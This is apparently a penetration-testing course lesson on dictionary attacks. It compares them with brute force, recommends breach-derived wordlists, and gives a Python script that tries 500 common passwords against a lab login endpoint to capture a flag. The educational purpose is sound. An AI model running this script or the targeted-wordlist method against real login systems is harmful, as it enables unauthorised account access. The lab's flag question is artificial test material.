
<h1>Dictionary Attacks</h1>
<p>While comprehensive, the brute-force approach can be time-consuming and resource-intensive, especially when dealing with complex passwords. That's where dictionary attacks come in.</p>
<h2>The Power of Words</h2>
<p>The effectiveness of a dictionary attack lies in its ability to exploit the human tendency to prioritize memorable passwords over secure ones. Despite repeated warnings, many individuals continue to opt for passwords based on readily available information such as dictionary words, common phrases, names, or easily guessable patterns. This predictability makes them vulnerable to dictionary attacks, where attackers systematically test a pre-defined list of potential passwords against the target system.</p>
<p>The success of a dictionary attack hinges on the quality and specificity of the wordlist used. A well-crafted wordlist tailored to the target audience or system can significantly increase the probability of a successful breach. For instance, if the target is a system frequented by gamers, a wordlist enriched with gaming-related terminology and jargon would prove more effective than a generic dictionary. The more closely the wordlist reflects the likely password choices of the target, the higher the chances of a successful attack.</p>
<p>At its core, the concept of a dictionary attack is rooted in understanding human psychology and common password practices. By leveraging this insight, attackers can efficiently crack passwords that might otherwise necessitate an impractically lengthy brute-force attack. In this context, the power of words resides in their ability to exploit human predictability and compromise otherwise robust security measures.</p>
<h2>Brute Force vs. Dictionary Attack</h2>
<p>The fundamental distinction between a brute-force and a dictionary attack lies in their methodology for generating potential password candidates:</p>
<ul>
<li>
<code>Brute Force</code>: A pure brute-force attack systematically tests <em>every possible combination</em> of characters within a predetermined set and length. While this approach guarantees eventual success given enough time, it can be extremely time-consuming, particularly against longer or complex passwords.</li>
<li>
<code>Dictionary Attack</code>: In stark contrast, a dictionary attack employs a pre-compiled list of words and phrases, dramatically reducing the search space. This targeted methodology results in a far more efficient and rapid attack, especially when the target password is suspected to be a common word or phrase.</li>
</ul>
<table>
<thead>
<tr>
<th>Feature</th>
<th>Dictionary Attack</th>
<th>Brute Force Attack</th>
<th>Explanation</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Efficiency</code></td>
<td>Considerably faster and more resource-efficient.</td>
<td>Can be extremely time-consuming and resource-intensive.</td>
<td>Dictionary attacks leverage a pre-defined list, significantly narrowing the search space compared to brute-force.</td>
</tr>
<tr>
<td><code>Targeting</code></td>
<td>Highly adaptable and can be tailored to specific targets or systems.</td>
<td>No inherent targeting capability.</td>
<td>Wordlists can incorporate information relevant to the target (e.g., company name, employee names), increasing the success rate.</td>
</tr>
<tr>
<td><code>Effectiveness</code></td>
<td>Exceptionally effective against weak or commonly used passwords.</td>
<td>Effective against all passwords given sufficient time and resources.</td>
<td>If the target password is within the dictionary, it will be swiftly discovered. Brute force, while universally applicable, can be impractical for complex passwords due to the sheer volume of combinations.</td>
</tr>
<tr>
<td><code>Limitations</code></td>
<td>Ineffective against complex, randomly generated passwords.</td>
<td>Often impractical for lengthy or highly complex passwords.</td>
<td>A truly random password is unlikely to appear in any dictionary, rendering this attack futile. The astronomical number of possible combinations for lengthy passwords can make brute-force attacks infeasible.</td>
</tr>
</tbody>
</table>
<p>Consider a hypothetical scenario where an attacker targets a company's employee login portal. The attacker might construct a specialized wordlist that incorporates the following:</p>
<ul>
<li>Commonly used, weak passwords (e.g., "password123," "qwerty")</li>
<li>The company name and variations thereof</li>
<li>Names of employees or departments</li>
<li>Industry-specific jargon</li>
</ul>
<p>By deploying this targeted wordlist in a dictionary attack, the attacker significantly elevates their likelihood of successfully cracking employee passwords compared to a purely random brute-force endeavor.</p>
<h2>Building and Utilizing Wordlists</h2>
<p>Wordlists can be obtained from various sources, including:</p>
<ul>
<li>
<code>Publicly Available Lists</code>: The internet hosts a plethora of freely accessible wordlists, encompassing collections of commonly used passwords, leaked credentials from data breaches, and other potentially valuable data. Repositories like <a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a> offer various wordlists catering to various attack scenarios.</li>
<li>
<code>Custom-Built Lists</code>: Penetration testers can craft their wordlists by leveraging information gleaned during the reconnaissance phase. This might include details about the target's interests, hobbies, personal information, or any other data for password creation.</li>
<li>
<code>Specialized Lists</code>: Wordlists can be further refined to target specific industries, applications, or even individual companies. These specialized lists increase the likelihood of success by focusing on passwords that are more likely to be used within a particular context.</li>
<li>
<code>Pre-existing Lists</code>: Certain tools and frameworks come pre-packaged with commonly used wordlists. For instance, penetration testing distributions like ParrotSec often include wordlists like <code>rockyou.txt</code>, a massive collection of leaked passwords, readily available for use.</li>
</ul>
<p>Here is a table of some of the more useful wordlists for login brute-forcing:</p>
<table>
<thead>
<tr>
<th>Wordlist</th>
<th>Description</th>
<th>Typical Use</th>
<th>Source</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rockyou.txt</code></td>
<td>A popular password wordlist containing millions of passwords leaked from the RockYou breach.</td>
<td>Commonly used for password brute force attacks.</td>
<td><a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">RockYou breach dataset</a></td>
</tr>
<tr>
<td><code>top-usernames-shortlist.txt</code></td>
<td>A concise list of the most common usernames.</td>
<td>Suitable for quick brute force username attempts.</td>
<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">SecLists</a></td>
</tr>
<tr>
<td><code>xato-net-10-million-usernames.txt</code></td>
<td>A more extensive list of 10 million usernames.</td>
<td>Used for thorough username brute forcing.</td>
<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt">SecLists</a></td>
</tr>
<tr>
<td><code>2023-200_most_used_passwords.txt</code></td>
<td>A list of the 200 most commonly used passwords as of 2023.</td>
<td>Effective for targeting commonly reused passwords.</td>
<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt">SecLists</a></td>
</tr>
<tr>
<td><code>Default-Credentials/default-passwords.txt</code></td>
<td>A list of default usernames and passwords commonly used in routers, software, and other devices.</td>
<td>Ideal for trying default credentials.</td>
<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt">SecLists</a></td>
</tr>
</tbody>
</table>
<h2>Throwing a dictionary at the problem</h2>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>To follow along, start the target system via the question section at the bottom of the page.</b></p>
</div>
</div>
The instance application creates a route (`/dictionary`) that handles POST requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. If there's a match, it responds with a JSON object containing a success message and the flag. Otherwise, it returns an error message with a 401 status code (Unauthorized).
<p>Copy and paste this Python script below as <code>dictionary-solver.py</code> onto your machine. You only need to modify the IP and port variables to match your target system information.</p>
<pre><code class="language-python">import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
</code></pre>
<p>The Python script orchestrates the dictionary attack. It performs the following steps:</p>
<ol>
<li>
<code>Downloads the Wordlist</code>: First, the script fetches a wordlist of 500 commonly used (and therefore weak) passwords from SecLists using the <code>requests</code> library.</li>
<li>
<code>Iterates and Submits Passwords</code>: It then iterates through each password in the downloaded wordlist. For each password, it sends a POST request to the Flask application's <code>/dictionary</code> endpoint, including the password in the request's form data.</li>
<li>
<code>Analyzes Responses</code>: The script checks the response status code after each request. If it's 200 (OK), it examines the response content further. If the response contains the "flag" key, it signifies a successful login. The script then prints the discovered password and the captured flag.</li>
<li>
<code>Continues or Terminates</code>: If the response doesn't indicate success, the script proceeds to the next password in the wordlist. This process continues until the correct password is found or the entire wordlist is exhausted.</li>
</ol>
<pre><code class="language-shell-session">[!bash!]$ python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
</code></pre>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="116"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> After successfully brute-forcing the target using the script, what is the full flag the script returns?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer116" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-116">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="116" id="btnAnswer116">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
